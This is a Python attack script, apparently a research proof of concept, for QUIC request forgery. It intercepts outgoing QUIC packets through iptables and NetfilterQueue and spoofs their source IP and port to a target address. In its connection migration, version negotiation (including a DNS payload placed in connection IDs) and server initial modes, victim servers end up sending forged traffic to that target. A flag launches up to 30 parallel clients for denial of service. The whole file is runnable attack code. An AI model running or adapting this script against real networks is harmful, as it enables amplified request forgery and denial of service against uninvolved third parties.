#!/usr/bin/python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
import time
import subprocess
import os
import ssl
import argparse
from argparse import RawTextHelpFormatter
from multiprocessing import Process
import traceback

import aioquic
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h0.connection import H0Connection
from aioquic.h3.connection import H3Connection
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent
from aioquic.tls import CipherSuite, SessionTicket
from aioquic.quic.packet import QuicProtocolVersion

import minimal_http_client as cl
import vnrf_payload_dns as vp_dns

# Constants for counting packets
spoofed_packet_count = 0
total_packet_count = 0

# Iptables command template
iptables_command_template = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"

# Paths to QUIC clients
lsquic_command_template = "/home/neo/Desktop/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/neo/Desktop/QUICforge-main/secrets -p {path} -K"
lsquic_version_flag = " -o version={version}"
lsquic_alpn_flag = " -Q {alpn}"

quicly_command_template = "/home/client/quic/quicly/quicly/cli {victim_ip} {victim_port} -O -p {path} -a {alpn}"

def argument_parser():
    description = "QUIC Request Forgery Attack Script"
    parser = argparse.ArgumentParser(description=description)
    parser._optionals.title = 'Optional Arguments'
    parser._positionals.title = 'Required Arguments'

    options_parser = argparse.ArgumentParser(add_help=False)
    options_parser.add_argument('victim_ip', help='IP address of the victim server for the QUIC connection')
    options_parser.add_argument('target_ip', help='IP address of the target for forged requests')
    options_parser.add_argument('--victim_port', '-v', help='Victim server port, default is 12345', default=12345, type=int)
    options_parser.add_argument('--target_port', '-t', help='Target server port', default=0, type=int)
    options_parser.add_argument('--path', '-p', help='Path for HTTP requests', default="/")
    options_parser.add_argument('--alpn', '-a', help='ALPN to be used, default is h3', default='h3')
    options_parser.add_argument('--dos', '-d', help='Number of client processes to start', type=int, default=1, choices=range(1, 31), metavar="[1-32]")

    subparsers = parser.add_subparsers(required=True, dest='mode')

    # Subparser for connection migration mode
    parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[options_parser], description=description + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
    parser_cm.add_argument('--start_time', '-s', help='Wait time before triggering migration', type=int, default=4)
    parser_cm.add_argument('--limit', '-l', help='Limit number of spoofed packets, default: 0 (no limit)', type=int, default=0)
    parser_cm.add_argument('--legacy', '-e', help='Enable legacy client mode', default=False, choices=['lsquic', 'quicly'])
    parser_cm.add_argument('--host', '-H', help='(legacy only) Hostname for SNI, default is www.example.com', default='www.example.com')
    parser_cm.add_argument('--version', '-V', help='(legacy only) QUIC version to be used', choices=['h3-27', 'h3-29', '1'], default='1')

    # Subparser for version negotiation mode
    parser_vn = subparsers.add_parser('vn', help='Version negotiation mode', parents=[options_parser], description=description + '\nVersion Negotiation Mode', formatter_class=RawTextHelpFormatter)
    parser_vn.add_argument('--cid_len', '-c', help='CID length in initial message', choices=range(0, 256), metavar="[0-255]", type=int, default=20)
    parser_vn.add_argument('--payload_mode', '-M', help='Payload type for VNRF', default=None, choices=['dns'])
    parser_vn.add_argument('--payload', '-P', help='Payload for VNRF attack', default="")

    # Subparser for server initial mode
    parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[options_parser], description=description + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
    parser_si.add_argument('--legacy', '-e', help='Enable legacy client mode', default=False, choices=['lsquic', 'quicly'])
    parser_si.add_argument('--host', '-H', help='(legacy only) Hostname for SNI', default='www.example.com')
    parser_si.add_argument('--version', '-V', help='(legacy only) QUIC version', choices=['h3-27', 'h3-29', '1'], default='1')

    return parser.parse_args()

def modify_packet(packet, spoofed_ip, spoofed_port=0):
    ip_payload = IP(packet.get_payload())

    original_ip = ip_payload.src
    ip_payload.src = spoofed_ip

    original_port = ip_payload.sport
    if spoofed_port != 0:
        ip_payload.sport = spoofed_port

    del ip_payload[IP].chksum
    del ip_payload[UDP].chksum
    packet.set_payload(bytes(ip_payload))
    print(f"[*] {original_ip}:{original_port} -> {spoofed_ip}:{(spoofed_port if spoofed_port != 0 else original_port)}")
    
    return packet

def handle_connection_migration(packet, start_time=0, args=None):
    global spoofed_packet_count
    global total_packet_count

    total_packet_count += 1

    if args.limit and spoofed_packet_count >= args.limit:
        packet.drop()
        return

    if total_packet_count > 1:
        packet = modify_packet(packet, args.target_ip, args.target_port)
        if args.limit:
            spoofed_packet_count += 1

    packet.accept()

def handle_version_negotiation(packet, args=None):
    global spoofed_packet_count
    if args.limit and spoofed_packet_count >= args.limit:
        packet.drop()
        return

    packet = modify_packet(packet, args.target_ip, args.target_port)
    if args.limit:
        spoofed_packet_count += 1

    packet.accept()

def handle_server_initial(packet, args=None):
    global spoofed_packet_count
    if args.limit and spoofed_packet_count >= args.limit:
        packet.drop()
        return

    packet = modify_packet(packet, args.target_ip, args.target_port)
    if args.limit:
        spoofed_packet_count += 1

    packet.accept()

def setup_client_configuration(args):
    if not args.path.startswith("/"):
        args.path = "/" + args.path
    request_url = f"https://{args.victim_ip}:{args.victim_port}{args.path}"
    protocol_version = 'VNRF' if args.mode == "vn" else "VERSION_1"
    cid_length = args.cid_len if "cid_len" in args else 20

    init_dcid = os.urandom(cid_length)
    init_scid = os.urandom(cid_length)
    
    if args.mode == 'vn' and args.payload_mode:
        if args.payload_mode == "dns":
            init_dcid, init_scid = vp_dns.create_payload(args.payload)
            protocol_version = "NEGOTIATION"

    quic_config = QuicConfiguration(
        is_client=True,
        supported_versions=[QuicProtocolVersion[protocol_version].value],
        alpn_protocols=[args.alpn],
        verify_mode=ssl.CERT_NONE,
        secrets_log_file=open("secrets/secrets.log", "w"),
        connection_id_length=cid_length,
        init_dcid=init_dcid,
        init_scid=init_scid,
    )

    return request_url, quic_config

def setup_legacy_client(args):
    command = ""
    if args.legacy == 'lsquic':
        command = lsquic_command_template.format(victim_ip=args.victim_ip, victim_port=args.victim_port, host=args.host, path=args.path)
        if args.version and args.version != '1':
            command += lsquic_version_flag.format(version=args.version)
        if args.alpn and args.alpn != 'h3':
            command += lsquic_alpn_flag.format(alpn=args.alpn)

    if args.legacy == 'quicly':
        command = quicly_command_template.format(victim_ip=args.victim_ip, victim_port=args.victim_port, path=args.path, alpn=args.alpn)

    print(command)
    return command

def main():
    if os.geteuid() != 0:
        exit("[!] Please run this script as root")

    args = argument_parser()
    start_time = time.time()
    iptables_command = iptables_command_template.format(action="-I", victim_ip=args.victim_ip, victim_port=args.victim_port)
    print("[+] Inserting iptables rules.")
    subprocess.run(iptables_command.split())

    try:
        nfqueue = NetfilterQueue()
        if args.mode == 'cm':
            args.limit *= args.dos
            nfqueue.bind(1, lambda pkt, start_time=start_time, args=args: handle_connection_migration(pkt, start_time, args))
        elif args.mode == 'vn':
            args.limit = args.dos
            nfqueue.bind(1, lambda pkt, args=args: handle_version_negotiation(pkt, args))
        elif args.mode == 'si':
            args.limit = args.dos
            nfqueue.bind(1, lambda pkt, args=args: handle_server_initial(pkt, args))
        else:
            raise NotImplementedError("Mode not implemented")

        print("[+] Starting client")
        processes = []
        if args.mode in ('cm', 'si') and args.legacy:
            print("[!] Legacy Mode")
            command = setup_legacy_client(args)
            for _ in range(args.dos):
                process = subprocess.Popen(command.split(), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                processes.append(process)
        else:
            request_url, quic_config = setup_client_configuration(args)
            for _ in range(args.dos):
                process = Process(target=cl.start_client, args=(request_url, quic_config,))
                processes.append(process)
                process.start()

        print("[+] Hooking into nfqueue")
        nfqueue.run()

    except KeyboardInterrupt:
        print("[-] Keyboard interrupt received. Terminating attack script.")
    except Exception as e:
        print("[!] An error occurred!")
        print(e)
        print(traceback.format_exc())

    print("\n[+] Cleaning up")
    print("[-] Terminating Client(s)")
    
    for proc in processes:
        try:
            proc.terminate()
        except:
            pass
    print("[-] Unbinding netfilter queue.")
    nfqueue.unbind()

    print("[-] Deleting iptables rules.")
    delete_command = iptables_command_template.format(action="-D", victim_ip=args.victim_ip, victim_port=args.victim_port)
    subprocess.run(delete_command.split())
    print("[+] Done")

if __name__ == "__main__":
    main()
